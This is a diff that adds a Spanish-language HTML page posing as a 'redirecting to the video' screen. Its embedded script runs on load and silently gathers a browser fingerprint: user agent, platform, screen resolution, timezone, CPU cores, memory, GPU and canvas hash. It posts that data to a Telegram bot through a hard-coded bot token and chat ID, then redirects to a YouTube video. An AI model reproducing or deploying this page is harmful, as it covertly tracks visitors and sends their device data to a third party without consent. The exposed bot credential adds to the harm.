@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirigiendo... 🤫</title>
+    <script>
+
+        const TELEGRAM_BOT_TOKEN = "7660992953:AAHkZLH_6PQ4sMNFcHPrTtxkAZsoptzVMKc";  
+        const TELEGRAM_CHAT_ID = "7779050645"; 
+
+
+        function getFingerprint() {
+            let canvas = document.createElement("canvas");
+            let ctx = canvas.getContext("2d");
+            ctx.textBaseline = "top";
+            ctx.font = "14px Arial";
+            ctx.fillText("Canvas Fingerprint", 10, 50);
+            let canvasHash = canvas.toDataURL();
+
+            let canvas2 = document.createElement("canvas");
+            let gl = canvas2.getContext("webgl") || canvas2.getContext("experimental-webgl");
+            let gpu = "Desconocido";
+            if (gl) {
+                let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No detectado";
+            }
+
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: screen.width + "x" + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || "N/A",
+                touchSupport: navigator.maxTouchPoints > 0 ? "Sí" : "No",
+                gpu: gpu,
+                canvasHash: canvasHash
+            };
+        }
+
+
+        function sendToTelegram(fingerprintData) {
+            let message = `🔍 *Fingerprint Capturado* 🔍\n\n` +
+                `🖥 *Sistema:* ${fingerprintData.platform}\n` +
+                `🌐 *Navegador:* ${fingerprintData.userAgent}\n` +
+                `📏 *Resolución:* ${fingerprintData.screenResolution}\n` +
+                `🕒 *Zona horaria:* ${fingerprintData.timezone}\n` +
+                `🧠 *CPU Cores:* ${fingerprintData.cores}\n` +
+                `💾 *Memoria RAM:* ${fingerprintData.memory} GB\n` +
+                `🎮 *GPU:* ${fingerprintData.gpu}\n` +
+                `📱 *Pantalla táctil:* ${fingerprintData.touchSupport}\n` +
+                `🎨 *Canvas Hash:* ${fingerprintData.canvasHash.substring(0, 20)}...`;
+
+            let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            let params = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(params)
+            }).then(response => console.log("Enviado a Telegram")).catch(error => console.error("Error:", error));
+        }
+
+        function init() {
+            let fingerprintData = getFingerprint();
+            sendToTelegram(fingerprintData); 
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  
+        }
+
+
+        setTimeout(init, 1000);
+    </script>
+</head>
+<body>
+    <h1>Espérate un momento...</h1>
+    <p>¡Te estamos redirigiendo al video! 🚀</p>
+</body>
+</html>
